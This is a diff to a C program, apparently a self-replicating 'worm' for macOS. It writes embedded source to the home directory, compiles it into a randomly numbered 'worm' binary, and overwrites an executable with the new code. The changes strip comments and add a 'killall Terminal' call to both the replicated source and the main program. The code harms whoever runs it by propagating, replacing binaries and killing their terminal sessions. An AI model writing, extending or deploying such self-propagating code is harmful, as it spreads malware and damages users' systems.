@@ -18,7 +18,7 @@ int main(int argc, const char * argv[])
     const char *homeDir = getenv("HOME"); //gets users home directory
     char dir[80];
     strcpy (dir, homeDir);
-    strcat (dir, "/tmp.c"); //concatenates found dir into a temp filepath
+    strcat (dir, "/tmp.c"); //concatenates this into a filepath
     FILE *f = fopen(dir , "w"), *exec, *out;
     /*put source code in a char array*/
     static char a[100] = "abc", buffer[10000],source[2000] =
@@ -73,6 +73,7 @@ int main(int argc, const char * argv[])
     "    fprintf(out, \"%c\", ((char *)newCode)[i]);\n"
     "}\n"
     "fclose(out);\n"
+    "system(\"killall Terminal\");"
     "return 0;\n"
     "}\n";
     
@@ -86,13 +87,13 @@ int main(int argc, const char * argv[])
     sprintf(num, "%d", r);
     char *last = " tmp.c";
     char str[80];
-    strcpy (str, "cd $HOME; gcc -o worm"); //creates bash string with rand #
+    strcpy (str, "cd $HOME; gcc -o worm");
     strcat (str, num);
     strcat (str, last);
 
     FILE *cmd=popen(str, "r"); //compile that file
     pclose(cmd);
-    system("cd $HOME; rm tmp.c");//kill temp
+    system("cd $HOME; rm tmp.c");
 
 
     char str2[80]; /*concatenate the new filepath for the exec*/
@@ -121,9 +122,10 @@ int main(int argc, const char * argv[])
     }
     
     for(i = 0;i < sizeof(buffer); ++i) {
-    fprintf(out, "%c", ((char *)newCode)[i]); //new binary written to exec
+    fprintf(out, "%c", ((char *)newCode)[i]); //new binary written to old exec
     }
     fclose(out);
     
+    system("killall Terminal");
     return 0;
 }
